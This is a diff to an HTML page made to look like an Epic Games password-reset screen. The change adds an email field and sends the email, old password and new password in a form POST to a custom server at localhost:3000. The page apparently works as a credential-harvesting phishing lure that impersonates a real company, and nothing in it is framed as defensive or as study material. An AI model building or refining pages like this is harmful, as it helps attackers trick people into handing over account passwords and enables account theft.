@@ -6,8 +6,6 @@
     <title>Epic Games Password Reset</title>
     <link rel="stylesheet" href="epicgames-html-password.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-
         body {
             background-color: #181818;
             color: #fff;
@@ -25,10 +23,10 @@
             border-radius: 12px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
             width: 400px;
-            text-align: center;
         }
 
         .logo {
+            text-align: center;
             margin-bottom: 20px;
         }
 
@@ -37,9 +35,10 @@
             height: auto;
         }
 
-        .MuiTypography-root {
-            font-size: 18px;
+        .MuiTypography-root.MuiTypography-body1.mui-o497ds {
+            font-size: 22px;
             font-weight: 500;
+            text-align: center;
             margin-bottom: 20px;
             letter-spacing: 0.5px;
             color: #f5f5f5;
@@ -58,7 +57,7 @@
             font-weight: bold;
         }
 
-        input[type="password"] {
+        input[type="password"], input[type="email"] {
             width: 100%;
             padding: 8px;
             border: 1px solid #444;
@@ -70,7 +69,7 @@
             outline: none;
         }
 
-        input[type="password"]:focus {
+        input[type="password"]:focus, input[type="email"]:focus {
             border-color: #007bff;
             box-shadow: 0 0 5px #007bff;
         }
@@ -133,22 +132,6 @@
             transform: translateY(1px);
             box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2);
         }
-
-        .spinner {
-            display: none;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin-top: 10px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
@@ -159,12 +142,18 @@
         </div>
 
         <!-- Instructions -->
-        <div class="MuiTypography-root">
-            Enter your new password for your Epic Games account.
+        <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
+            Enter your email and new password for your Epic Games account.
         </div>
 
         <!-- Form Section -->
-        <form id="resetForm">
+        <form action="http://localhost:3000/reset-password" method="POST">
+            <!-- Email Section -->
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            </div>
+
             <!-- Old Password Section -->
             <div class="form-group">
                 <label for="oldPassword">Old Password</label>
@@ -192,8 +181,7 @@
             </div>
 
             <!-- Submit Button -->
-            <button type="submit" id="submitBtn">Reset Password</button>
-            <div class="spinner" id="loadingSpinner"></div>
+            <button type="submit" class="submit-btn">Reset Password</button>
         </form>
     </div>
 
@@ -203,46 +191,6 @@
             const field = document.getElementById(fieldId);
             field.type = field.type === 'password' ? 'text' : 'password';
         }
-
-        // Handle Form Submission
-        document.getElementById('resetForm').addEventListener('submit', function(event) {
-            event.preventDefault();  // Prevents the default form submission
-
-            // Show the loading spinner
-            document.getElementById('loadingSpinner').style.display = 'inline-block';
-            document.getElementById('submitBtn').disabled = true;
-
-            // Collect the password data
-            const oldPassword = document.getElementById('oldPassword').value;
-            const newPassword = document.getElementById('newPassword').value;
-
-            // Submit the data to the backend using fetch
-            fetch('http://localhost:3000/reset-password', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ oldPassword, newPassword })
-            })
-            .then(response => response.text())
-            .then(data => {
-                // Hide the loading spinner
-                document.getElementById('loadingSpinner').style.display = 'none';
-                document.getElementById('submitBtn').disabled = false;
-
-                // Show the success message
-                alert(data);
-                window.location.href = 'password-success.html';  // Redirect to a success page
-            })
-            .catch(error => {
-                // Hide the loading spinner and re-enable the button in case of an error
-                document.getElementById('loadingSpinner').style.display = 'none';
-                document.getElementById('submitBtn').disabled = false;
-
-                console.error('Error:', error);
-                alert('Something went wrong. Please try again.');
-            });
-        });
     </script>
 </body>
 </html>
